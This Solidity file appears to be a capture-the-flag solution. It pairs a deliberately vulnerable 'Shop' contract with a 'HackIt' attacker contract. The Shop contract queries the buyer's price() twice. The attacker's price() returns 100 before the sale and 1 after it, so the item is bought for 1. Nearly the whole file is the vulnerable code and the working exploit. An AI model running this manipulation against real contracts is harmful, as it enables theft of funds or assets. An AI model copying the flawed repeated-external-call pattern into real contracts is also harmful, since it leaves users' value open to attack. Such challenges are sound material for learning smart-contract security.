// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBuyer {
  function price() external view returns (uint256);
}

contract Shop {
  uint256 public price = 100;
  bool public isSold;

  function buy() public {
    IBuyer _buyer = IBuyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract HackIt {
    uint256 Price1 = 100;
    uint256 Price2 = 1;

    Shop shop;

    constructor(Shop _shop){
        shop = _shop;
    }

    function price() external view returns (uint256) {
        if(shop.isSold() == false){
            return Price1;
        } else if(shop.isSold() == true) {
            return Price2;
        }
    }

    function hackit() public {
        shop.buy();
    }
}